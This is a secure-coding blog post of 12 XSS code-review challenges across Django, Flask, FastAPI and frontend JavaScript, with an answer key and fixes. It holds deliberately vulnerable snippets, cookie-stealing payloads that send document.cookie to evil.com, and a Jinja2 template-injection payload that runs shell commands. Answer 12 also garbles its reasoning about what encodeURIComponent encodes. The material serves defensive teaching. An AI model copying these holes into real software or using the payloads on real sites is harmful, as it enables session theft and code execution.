---
title: "Can You Spot the XSS Bug? 12 Code Review Challenges Across Flask, Django, FastAPI, and the Frontend"
published: false
description: "12 real-world XSS code review challenges across Flask, Django, FastAPI, and vanilla JS/React. Each snippet has exactly one bug — missing escaping, wrong-context escaping, or misplaced escaping. Can you find all 12?"
tags: security, python, appsec, webdev
cover_image:
series: P2P AppSec Exercise Series
---

# Can You Spot the XSS Bug? 12 Code Review Challenges Across Flask, Django, FastAPI, and the Frontend

**Format:** Read each snippet. Identify the bug type and where the fix belongs. Reveal answers are hidden below each case.  
**Difficulty:** Intermediate — assumes you know what XSS is, not necessarily where every framework hides it.  
**Skills:** Code review, output escaping, context-aware security, Django/Flask/FastAPI/JS

> ⭐ If this is useful, [star the repo](https://github.com/fosres/SecEng-Exercises) — it helps other Security Engineers find these challenges.  
> 📊 [Why are you reading this?](https://strawpoll.com/wby5QoKAkyA) (30-second poll)

---

## Before You Start: The Three Bug Types

Every XSS bug in this post belongs to exactly one of three categories. Burn these definitions into your brain before reading the snippets — they are the vocabulary of real code review findings.

**Bug Type 1 — Missing escaping entirely**  
User-controlled data reaches the render layer raw. No escaping function was called. The browser receives executable content and the developer relied on some other layer (framework auto-escaping, input validation) that either does not apply here or was explicitly bypassed.

**Bug Type 2 — Wrong context escaping**  
An escaping function *was* called, but it is the wrong one for the output context. HTML-escaping a value destined for a JavaScript string literal is the canonical example: `&lt;` inside a JS string renders as `&lt;` — it does not prevent `</script>` breakout. The escaping happened; it was just the wrong kind for where the data lands.

**Bug Type 3 — Misplaced escaping**  
Escaping is applied at the wrong point in the data pipeline. This includes: escaping at input time instead of output time (so the escaped data gets stored, then escaped again at render — double-encoding), escaping server-side for a value that a client-side framework will escape again, or calling `mark_safe()` on data before passing it to a template.

Byrne summarises the core principle in *Full Stack Python Security* (Ch. 14, p. 218, Manning 2021): "Input sanitization is always a bad idea because it is too difficult to implement." The correct place for escaping is always the output layer, in the correct context.

---

## The Backend Cases

### Case 1 — Django: The `|safe` Trap

```python
# views.py
from django.shortcuts import render

def search_results(request):
    query = request.GET.get("q", "")
    return render(request, "results.html", {"query": query})
```

```html
<!-- results.html -->
<html>
<body>
  <h2>Results for: {{ query|safe }}</h2>
  {% for result in results %}
    <p>{{ result.title }}</p>
  {% endfor %}
</body>
</html>
```

**What is the bug type? Where is the fix?**

*(Answer in the key below.)*

---

### Case 2 — Django: HTML-Escaping Into a JavaScript Context

```python
# views.py
from django.shortcuts import render
from django.utils.html import escape

def user_profile(request):
    username = escape(request.GET.get("name", ""))
    return render(request, "profile.html", {"username": username})
```

```html
<!-- profile.html -->
<html>
<head>
  <script>
    var currentUser = "{{ username }}";
    console.log("Logged in as: " + currentUser);
  </script>
</head>
<body><h1>Profile</h1></body>
</html>
```

**What is the bug type? Where is the fix?**

*(Answer in the key below.)*

---

### Case 3 — Django: `mark_safe()` in the View

```python
# views.py
from django.shortcuts import render
from django.utils.html import escape
from django.utils.safestring import mark_safe

def comment_list(request):
    raw_comments = Comment.objects.values_list("body", flat=True)
    # "Sanitise" before passing to template
    safe_comments = [mark_safe(escape(c)) for c in raw_comments]
    return render(request, "comments.html", {"comments": safe_comments})
```

```html
<!-- comments.html -->
<ul>
  {% for comment in comments %}
    <li>{{ comment }}</li>
  {% endfor %}
</ul>
```

**What is the bug type? Where is the fix?**

*(Answer in the key below.)*

---

### Case 4 — Flask: Raw `render_template_string` With User Input

```python
# app.py
from flask import Flask, request, render_template_string

app = Flask(__name__)

TEMPLATE = """
<html>
<body>
  <h1>Hello, %s!</h1>
</body>
</html>
"""

@app.route("/greet")
def greet():
    name = request.args.get("name", "guest")
    return render_template_string(TEMPLATE % name)
```

**What is the bug type? Where is the fix?**

*(Answer in the key below.)*

---

### Case 5 — Flask: URL-Encoding Into an HTML Attribute

```python
# app.py
from flask import Flask, request, render_template_string
from urllib.parse import quote

app = Flask(__name__)

@app.route("/redirect-preview")
def redirect_preview():
    destination = request.args.get("to", "/")
    safe_dest = quote(destination, safe="/:?=&")
    return render_template_string("""
    <html>
    <body>
      <a href="{{ dest }}">Click here to continue</a>
    </body>
    </html>
    """, dest=safe_dest)
```

**What is the bug type? Where is the fix?**

*(Answer in the key below.)*

---

### Case 6 — Flask: Escaping at Input Time (Double-Encoding)

```python
# app.py
from flask import Flask, request, render_template
import html

app = Flask(__name__)

@app.route("/submit", methods=["POST"])
def submit():
    # "Sanitise" inputs before storing
    title = html.escape(request.form.get("title", ""))
    body  = html.escape(request.form.get("body", ""))
    Post.create(title=title, body=body)
    return "Saved."

@app.route("/posts/<int:post_id>")
def view_post(post_id):
    post = Post.get(post_id)
    return render_template("post.html", post=post)
```

```html
<!-- post.html -->
<html>
<body>
  <h1>{{ post.title }}</h1>
  <p>{{ post.body }}</p>
</body>
</html>
```

**What is the bug type? Where is the fix?**

*(Answer in the key below.)*

---

### Case 7 — FastAPI: Raw HTML Response With User Data

```python
# main.py
from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()

@app.get("/hello", response_class=HTMLResponse)
def hello(name: str = "guest"):
    return f"""
    <html>
    <body>
      <h1>Welcome, {name}!</h1>
    </body>
    </html>
    """
```

**What is the bug type? Where is the fix?**

*(Answer in the key below.)*

---

### Case 8 — FastAPI: JSON Response Consumed by `innerHTML`

```python
# main.py
from fastapi import FastAPI
from pydantic import BaseModel

app = FastAPI()

class UserProfile(BaseModel):
    username: str
    bio: str

@app.get("/api/profile/{user_id}", response_model=UserProfile)
def get_profile(user_id: int):
    user = db.get_user(user_id)
    return UserProfile(username=user.username, bio=user.bio)
```

```javascript
// frontend.js
async function loadProfile(userId) {
    const resp = await fetch(`/api/profile/${userId}`);
    const data = await resp.json();

    document.getElementById("username").textContent = data.username;
    document.getElementById("bio").innerHTML = data.bio;   // ← here
}
```

**What is the bug type? Where is the fix?**

*(Answer in the key below.)*

---

### Case 9 — FastAPI: Server-Side Pre-Escaping Into a JSON Response

```python
# main.py
import html
from fastapi import FastAPI
from pydantic import BaseModel

app = FastAPI()

class SearchResult(BaseModel):
    title: str
    snippet: str

@app.get("/api/search", response_model=list[SearchResult])
def search(q: str):
    results = db.search(q)
    return [
        SearchResult(
            title=html.escape(r.title),
            snippet=html.escape(r.snippet)
        )
        for r in results
    ]
```

```javascript
// frontend.js — React component
function ResultCard({ title, snippet }) {
    return (
        <div>
            <h3>{title}</h3>
            <p>{snippet}</p>
        </div>
    );
}
```

**What is the bug type? Where is the fix?**

*(Answer in the key below.)*

---

## The Frontend Cases

### Case 10 — Vanilla JS: The Classic `innerHTML` Sink

```javascript
// search.js
async function runSearch() {
    const q = new URLSearchParams(window.location.search).get("q");
    document.getElementById("query-display").innerHTML =
        `You searched for: <strong>${q}</strong>`;

    const results = await fetch(`/api/search?q=${q}`).then(r => r.json());
    const list = document.getElementById("results");
    for (const item of results) {
        list.innerHTML += `<li>${item.title}</li>`;
    }
}
```

**What is the bug type? Where is the fix?** (There are two sinks — find both.)

*(Answer in the key below.)*

---

### Case 11 — React: `dangerouslySetInnerHTML` With Unvalidated API Data

```jsx
// CommentSection.jsx
import React, { useEffect, useState } from "react";

export default function CommentSection({ postId }) {
    const [comments, setComments] = useState([]);

    useEffect(() => {
        fetch(`/api/posts/${postId}/comments`)
            .then(r => r.json())
            .then(setComments);
    }, [postId]);

    return (
        <ul>
            {comments.map(c => (
                <li key={c.id}
                    dangerouslySetInnerHTML={{ __html: c.body }}
                />
            ))}
        </ul>
    );
}
```

**What is the bug type? Where is the fix?**

*(Answer in the key below.)*

---

### Case 12 — Vanilla JS: URL-Encoding Into a `href` DOM Attribute

```javascript
// profile.js
function renderProfileLink(username) {
    const encoded = encodeURIComponent(username);
    document.getElementById("profile-link").innerHTML =
        `<a href="/users/${encoded}">View profile</a>`;
}
```

**What is the bug type? Where is the fix?**

*(Answer in the key below.)*

---

---

## Answer Key

*Try all 12 cases before reading. Each answer explains the bug type, the mechanism, and the fix.*

### Answer 1 — Django: The `|safe` Trap

**Bug Type 1 — Missing escaping (bypassed by `|safe`)**

Django's template engine auto-escapes `{{ query }}` by default. The `|safe` filter explicitly suspends that protection for this variable. Byrne calls this out directly in *Full Stack Python Security* (p. 220): "It is easy to use the `safe` filter in an unsafe way. I personally think `unsafe` would have been a better name for this feature."

An attacker requests `/search?q=<script>document.location='https://evil.com?c='+document.cookie</script>` and the browser receives the script unescaped.

**Fix:** Remove `|safe`. The default `{{ query }}` is already protected. The `|safe` filter exists for the rare case where *you* built the HTML string and know it is clean — never for user-supplied data.

```html
<h2>Results for: {{ query }}</h2>
```

### Answer 2 — Django: HTML-Escaping Into a JavaScript Context

**Bug Type 2 — Wrong context escaping**

`django.utils.html.escape()` produces HTML entity encoding: `<` → `&lt;`, `"` → `&quot;`, etc. That is correct for an HTML body or attribute context. It is the wrong escaper for a JavaScript string literal context inside a `<script>` block.

Two problems survive HTML-escaping in JS context:

1. A single quote `'` in the input breaks out of the JS string if the template ever uses single-quoted delimiters
2. The sequence `</script>` in the input, even HTML-escaped to `&lt;/script&gt;`, does not help — the HTML parser runs *before* the JavaScript parser and closes the `<script>` block on the raw `</script>` substring. HTML entities are not decoded by the HTML parser before it looks for closing tags.

The OWASP XSS Prevention Cheat Sheet Rule #3 requires backslash-escaping for quotes and Unicode escape sequences (`\u003C`, `\u003E`, `\u0026`) for the angle brackets and ampersand — specifically because those Unicode escapes are invisible to the HTML parser while still being valid JavaScript.

**Fix:** Use a JavaScript-context escaper at the output layer, not an HTML escaper at the view layer.

```python
# views.py — do not pre-escape; pass raw and escape in template
def user_profile(request):
    username = request.GET.get("name", "")
    return render(request, "profile.html", {"username": username})
```

```html
<!-- profile.html — use Django's escapejs filter for JS context -->
<script>
  var currentUser = "{{ username|escapejs }}";
</script>
```

Django's built-in `|escapejs` filter applies the correct backslash-escaping rules for JavaScript string literal context.

### Answer 3 — Django: `mark_safe()` in the View

**Bug Type 3 — Misplaced escaping**

At first glance this looks correct: `escape()` HTML-encodes the comment, then `mark_safe()` tells Django's template engine not to re-escape it. The problem is architectural, not mechanical: escaping is happening in the *view* (business logic layer) rather than the *template* (output layer).

This pattern creates two compounding risks:

1. **Coupling and future breakage.** Any code path that uses `safe_comments` in a different output context — say, a JSON API response, an email body, or a future template where the data is embedded in a `<script>` block — now receives a `SafeString` that silently bypasses auto-escaping in that context too. The HTML-encoding is baked into the data, not applied at the output boundary.

2. **Double-encoding in mixed pipelines.** If the comments were *already* HTML-encoded in the database (from a previous developer's input-time sanitization pass), `escape()` encodes them again: `&amp;lt;` instead of `&lt;`.

Byrne demonstrates exactly this footgun in *Full Stack Python Security* (p. 220): "Applying `mark_safe` to data from an untrusted source is an invitation to be compromised."

**Fix:** Remove `mark_safe()` and `escape()` from the view entirely. Pass raw data to the template and let the template engine's auto-escaping do its job at the output layer, where it belongs.

```python
# views.py
def comment_list(request):
    comments = Comment.objects.values_list("body", flat=True)
    return render(request, "comments.html", {"comments": comments})
```

```html
<!-- comments.html — auto-escaping applies automatically -->
<ul>
  {% for comment in comments %}
    <li>{{ comment }}</li>
  {% endfor %}
</ul>
```

### Answer 4 — Flask: Raw `render_template_string` With User Input

**Bug Type 1 — Missing escaping (and Server-Side Template Injection)**

There are actually two vulnerabilities here, which is intentional — this is a real pattern seen in Flask codebases.

The `%s` string substitution happens *before* `render_template_string` parses the template. This means:

1. **XSS**: `?name=<script>alert(1)</script>` produces raw HTML with no escaping, because the value is injected into the template string before Jinja2 ever sees it — it is now part of the template text, not a template variable.
2. **SSTI**: `?name={{ 7*7 }}` causes Jinja2 to evaluate the expression, producing `49`. An attacker can escalate this to remote code execution via `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`.

The correct pattern uses Jinja2 template variables (`{{ name }}`), which the engine receives as *data*, not as template syntax. Jinja2 auto-escapes HTML in variables by default for templates with `.html` extensions or when `autoescape=True`.

**Fix:**

```python
@app.route("/greet")
def greet():
    name = request.args.get("name", "guest")
    return render_template_string(
        "<html><body><h1>Hello, {{ name }}!</h1></body></html>",
        name=name
    )
```

Or better, use a file-based template via `render_template("greet.html", name=name)`.

### Answer 5 — Flask: URL-Encoding Into an HTML Attribute

**Bug Type 2 — Wrong context escaping**

`urllib.parse.quote()` is the correct escaper for a URL *query parameter value*. It is not the correct escaper for an HTML attribute value.

Two separate things are happening in `href="{{ dest }}"`:

1. The value must be a *safe URL* — no `javascript:` scheme, no `//evil.com` protocol-relative prefix, no `data:` URI. `quote()` does not validate these; it only percent-encodes characters. `javascript:alert(1)` passes through `quote()` intact because `j`, `a`, `v`, `a`, `s`, `c`, `r`, `i`, `p`, `t`, `:` are all "safe" under its default rules.

2. The value must be properly escaped for the HTML attribute context — quotes must be entity-encoded so the attribute value cannot break out.

Jinja2's auto-escaping handles point 2 when the value arrives as a template variable (`{{ dest }}`). But point 1 — *is this a safe URL at all?* — is not addressed by either `quote()` or Jinja2.

An attacker submits `?to=javascript:document.location='https://evil.com?c='+document.cookie` and the rendered link executes the payload when clicked.

**Fix:** Validate the URL *as a security gate* before rendering, separate from encoding it.

```python
from urllib.parse import urlsplit

ALLOWED_HOSTS = {"example.com", "api.example.com"}

def is_safe_redirect(url: str) -> bool:
    if not url or url.startswith(("javascript:", "data:", "vbscript:", "//")):
        return False
    if url.startswith("/"):
        return True
    parsed = urlsplit(url)
    return parsed.hostname in ALLOWED_HOSTS and parsed.scheme == "https"

@app.route("/redirect-preview")
def redirect_preview():
    destination = request.args.get("to", "/")
    safe_dest = destination if is_safe_redirect(destination) else "/"
    return render_template_string(
        '<html><body><a href="{{ dest }}">Continue</a></body></html>',
        dest=safe_dest
    )
```

Jinja2 auto-escaping then handles the HTML attribute encoding. The URL validation is a separate, prior gate. Byrne covers this pattern in *Full Stack Python Security* (pp. 202-205).

### Answer 6 — Flask: Escaping at Input Time (Double-Encoding)

**Bug Type 3 — Misplaced escaping (input-time escape + Jinja2 re-escaping = double-encoding)**

The developer tried to do the right thing but placed the escaping at the wrong layer. Here is what happens to the input `Tom & Jerry`:

1. `html.escape("Tom & Jerry")` → `"Tom &amp; Jerry"` stored in the database
2. `render_template` passes `"Tom &amp; Jerry"` to Jinja2
3. Jinja2 auto-escaping encodes `&` again: `"Tom &amp;amp; Jerry"` in the HTML output

The user sees `Tom &amp; Jerry` rendered literally on the page — broken text, not a security vulnerability in this specific case. But the pattern becomes a genuine security bug when:

- The developer notices the double-encoding and adds `|safe` to "fix" it — now the HTML-encoded data bypasses Jinja2's auto-escaping entirely
- The stored `&amp;` values are consumed by a downstream API endpoint that returns them as JSON, and the frontend JavaScript double-decodes them into raw HTML

Byrne's principle applies here directly (*Full Stack Python Security*, p. 218): escaping belongs at the output layer. The database should store raw user data. Escaping is a rendering concern, not a storage concern.

**Fix:** Remove `html.escape()` from the view. Store raw data. Let Jinja2 auto-escape at render time.

```python
@app.route("/submit", methods=["POST"])
def submit():
    title = request.form.get("title", "")
    body  = request.form.get("body", "")
    Post.create(title=title, body=body)
    return "Saved."
```

### Answer 7 — FastAPI: Raw HTML Response With User Data

**Bug Type 1 — Missing escaping entirely**

FastAPI does not have a built-in template engine in its core — it is primarily a JSON API framework. When a developer reaches for `HTMLResponse` with an f-string to return a quick HTML page, there is no auto-escaping layer at all. The user-supplied `name` parameter is interpolated raw into the HTML string.

`GET /hello?name=<img src=x onerror=alert(document.cookie)>` executes in the browser immediately.

This pattern is common in FastAPI codebases when developers add a small HTML page alongside a primarily JSON API. The *API Security in Action* book (Ch. 2, p. 57, Manning 2019) notes that developers sometimes assume JSON output is immune to XSS — this case shows the same blind spot applied to HTML output: the assumption that f-strings are fine for "simple" pages.

**Fix:** Use Jinja2 templates via FastAPI's `Jinja2Templates` (from `starlette.templating`), which provides auto-escaping.

```python
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

@app.get("/hello")
def hello(request: Request, name: str = "guest"):
    return templates.TemplateResponse(
        "hello.html",
        {"request": request, "name": name}
    )
```

```html
<!-- templates/hello.html -->
<html><body><h1>Welcome, {{ name }}!</h1></body></html>
```

Jinja2 auto-escapes `{{ name }}` in `.html` templates by default.

### Answer 8 — FastAPI: JSON Response Consumed by `innerHTML`

**Bug Type 1 — Missing escaping (DOM sink on the frontend)**

The FastAPI endpoint is correct — it returns well-formed JSON with the right `Content-Type`. The vulnerability is entirely on the frontend. The `bio` field is written to a DOM element via `innerHTML`, which is an executable sink: the browser parses the value as HTML and executes any `<script>` tags or inline event handlers it contains.

`textContent` on the line above it is safe — that assignment treats the value as plain text, not HTML. The developer correctly used `textContent` for `username` but switched to `innerHTML` for `bio`, likely because they wanted to allow simple formatting like `<b>bold</b>` or `<i>italic</i>` in bios.

This maps directly to what *API Security in Action* (Ch. 2, pp. 55-57, Manning 2019) describes as the browser rendering path for API data: even a perfectly formed JSON response becomes an XSS vector the moment client-side JavaScript writes it to an HTML sink without escaping.

**Fix — option A (no formatting needed):** Use `textContent` for `bio` the same as `username`.

```javascript
document.getElementById("bio").textContent = data.bio;
```

**Fix — option B (markdown formatting wanted):** Render bio as Markdown server-side using a library like `mistune` with a sanitising renderer, or use a client-side library like DOMPurify to sanitise the HTML before assigning it to `innerHTML`.

```javascript
// DOMPurify sanitises the HTML before assigning to innerHTML
document.getElementById("bio").innerHTML = DOMPurify.sanitize(data.bio);
```

### Answer 9 — FastAPI: Server-Side Pre-Escaping Into a JSON Response

**Bug Type 3 — Misplaced escaping (server-side escape of data consumed by React)**

React automatically escapes all values interpolated into JSX via `{title}` and `{snippet}`. When React receives the string `Tom &amp; Jerry` (already HTML-escaped by the server), it renders it as the literal text `Tom &amp; Jerry` — with the entity visible — rather than `Tom & Jerry`. The user sees broken text.

The damage compounds if a future developer "fixes" the visible double-encoding by switching to `dangerouslySetInnerHTML`:

```jsx
// "Fix" that introduces XSS
<p dangerouslySetInnerHTML={{ __html: snippet }} />
```

Now the HTML-escaped string is decoded by the browser as HTML, and any remaining executable content — say, a `&lt;img src=x onerror=...&gt;` that wasn't fully escaped — executes.

The invariant is: JSON responses should carry *raw data*. The rendering layer (React, Django templates, Jinja2) owns escaping. Server-side HTML-encoding of JSON data is always wrong unless the consuming client is explicitly an HTML-context renderer — and if it is, you should be returning `text/html`, not `application/json`.

**Fix:** Remove `html.escape()` from the API layer entirely.

```python
@app.get("/api/search", response_model=list[SearchResult])
def search(q: str):
    results = db.search(q)
    return [
        SearchResult(title=r.title, snippet=r.snippet)
        for r in results
    ]
```

React's JSX interpolation handles escaping for its context. No escaping belongs in the JSON producer.

### Answer 10 — Vanilla JS: The Classic `innerHTML` Sink

**Bug Type 1 — Missing escaping (two DOM sinks)**

**Sink 1:** `document.getElementById("query-display").innerHTML` receives `q` directly from `window.location.search`. An attacker crafts the URL `?q=<img src=x onerror=alert(document.cookie)>` and the payload executes when the page loads — a classic reflected DOM-based XSS.

**Sink 2:** `list.innerHTML += \`<li>${item.title}</li>\`` — same problem for API-returned data. If `item.title` contains HTML, it executes. This is a stored XSS sink if titles come from a database.

PortSwigger's Web Security Academy lab "DOM XSS in `innerHTML` sink using `location.search` source" demonstrates exactly this attack path.

**Fix — Sink 1:** Build the DOM with `textContent` or `createTextNode`, not `innerHTML`.

```javascript
const display = document.getElementById("query-display");
display.textContent = "";
const prefix = document.createTextNode("You searched for: ");
const strong = document.createElement("strong");
strong.textContent = q;
display.appendChild(prefix);
display.appendChild(strong);
```

**Fix — Sink 2:** Create `<li>` elements programmatically.

```javascript
for (const item of results) {
    const li = document.createElement("li");
    li.textContent = item.title;
    list.appendChild(li);
}
```

`textContent` and DOM construction treat all values as text — no HTML parsing, no script execution.

### Answer 11 — React: `dangerouslySetInnerHTML` With Unvalidated API Data

**Bug Type 1 — Missing escaping**

React's JSX interpolation (`{c.body}`) is safe — React escapes HTML special characters automatically when assigning to text nodes. `dangerouslySetInnerHTML` explicitly bypasses that protection. Its name is a deliberate signal from the React team: the word "dangerous" is intentional, not hyperbolic.

Any user who submitted a comment containing `<script>alert(1)</script>` or `<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>` will have their payload execute in every other user's browser when they view the comments. This is stored XSS.

**Fix — if plain text:** Remove `dangerouslySetInnerHTML` and use JSX interpolation.

```jsx
<li key={c.id}>{c.body}</li>
```

**Fix — if Markdown or rich text is required:** Render Markdown server-side to a sanitised HTML string using a library that strips executable content (e.g. Python's `mistune` with a custom renderer that allowlists only safe tags), or use DOMPurify on the client:

```jsx
import DOMPurify from "dompurify";

<li key={c.id}
    dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(c.body) }}
/>
```

Never use `dangerouslySetInnerHTML` without a sanitiser on user-supplied content.

### Answer 12 — Vanilla JS: URL-Encoding Into a `href` DOM Attribute

**Bug Type 2 — Wrong context escaping**

`encodeURIComponent` is the correct escaper for a URL query parameter or path segment — it percent-encodes characters that are special to URL syntax. It is the wrong escaper for an HTML context, and `innerHTML` is an HTML sink.

Here is what happens with `username = 'onclick=alert(1) x='`:

- `encodeURIComponent('onclick=alert(1) x=\'')` → `'onclick%3Dalert(1)%20x%3D'`
- The browser decodes the `href` attribute value: `href="/users/onclick=alert(1) x='"` — wait, this particular payload is percent-encoded and *is* blocked here

But the real problem is that `innerHTML` is parsing the entire string as HTML, not just the `href`. A crafted username that survives `encodeURIComponent` — such as `"><img src=x onerror=alert(1)>` — breaks out of the `href` attribute entirely. The `"` is not encoded by `encodeURIComponent` when used in an HTML attribute context.

The two escaping operations required here are different and must both be applied:

1. URL escaping — for the path segment `/users/${username}`
2. HTML attribute escaping — for the `href="..."` attribute value

**Fix:** Build the DOM element programmatically. This avoids `innerHTML` entirely and uses the browser's own attribute-setting logic, which handles escaping correctly.

```javascript
function renderProfileLink(username) {
    const a = document.createElement("a");
    a.href = `/users/${encodeURIComponent(username)}`;
    a.textContent = "View profile";
    document.getElementById("profile-link").replaceChildren(a);
}
```

`element.href = url` assigns to the `href` DOM property, which the browser sets safely. `a.textContent = ...` sets the link text without HTML parsing. No `innerHTML` required.


## The Pattern Across All 12 Cases

Every bug in this post has the same root cause: **the wrong escaping strategy was applied at the wrong layer for the wrong context.** Not a missing library, not a missing framework, not a misconfigured header — a developer decision about where and how to escape.

The matrix:

| Bug Type | Backend tell | Frontend tell |
|---|---|---|
| Missing escaping | `\|safe`, `mark_safe()`, f-string HTML response, `autoescape off` | `innerHTML =`, `dangerouslySetInnerHTML` without DOMPurify |
| Wrong context | HTML escaper in JS context (`\|escape` inside `<script>`), URL encoder in HTML attribute | URL encoder (`encodeURIComponent`) written to `innerHTML` |
| Misplaced escaping | `html.escape()` at input time, stored HTML entities, server-escaping JSON for React | Server-pre-escaped HTML received by React JSX (double-encode artifact) |

Byrne's three-layer defense from *Full Stack Python Security* (pp. 208-226) applies uniformly: input validation (layer 1) guards domain constraints, output escaping (layer 2) guards the render layer in context, and response headers (layer 3) — CSP in particular — limit the blast radius when layers 1 and 2 fail. None of these layers makes the others redundant.

---

## What to Read Next

- *Full Stack Python Security*, Ch. 14 "Cross-site scripting attacks" — Dennis Byrne (Manning, 2021): the definitive treatment of output escaping in Django and Python
- *API Security in Action*, Ch. 2 §2.6 "Producing safe output" — Neil Madden (Manning, 2019): XSS from the API producer's perspective
- *Hacking APIs*, Ch. 12 "Injection" — Corey Ball (No Starch, 2022): XSS and Cross-API Scripting (XAS) from the attacker's perspective
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) — canonical escaping rules for all output contexts
- [PortSwigger DOM-based XSS learning path](https://portswigger.net/web-security/cross-site-scripting/dom-based) — hands-on labs for the DOM sink cases

---

## Get the Exercise Files

The previous post in this series challenges you to *implement* the XSS prevention framework from scratch — 100 tests across six escaping functions. If you want the hands-on coding version:

| File | Description |
|---|---|
| [xss_prevention_100_tests.py](https://github.com/fosres/SecEng-Exercises/blob/main/xss/xss_prevention_100_tests.py) | Challenge file — empty class + 100 tests |
| [xss_prevention_100_tests_solution.py](https://github.com/fosres/SecEng-Exercises/blob/main/xss/xss_prevention_100_tests_solution.py) | Reference solution |

Both live in the [`xss/` directory](https://github.com/fosres/SecEng-Exercises/tree/main/xss) of the [SecEng-Exercises repo](https://github.com/fosres/SecEng-Exercises).

If this post was useful, a ⭐ [on the repo](https://github.com/fosres/SecEng-Exercises) helps other Security Engineers find it. And [let me know why you read this](https://strawpoll.com/wby5QoKAkyA) — it directly shapes what I write next.

---

*Part of the P2P AppSec Exercise Series — LeetCode-style secure coding challenges designed to curate high-quality, secure Python code for AI training datasets. The goal: train AI models to write secure code by default.*
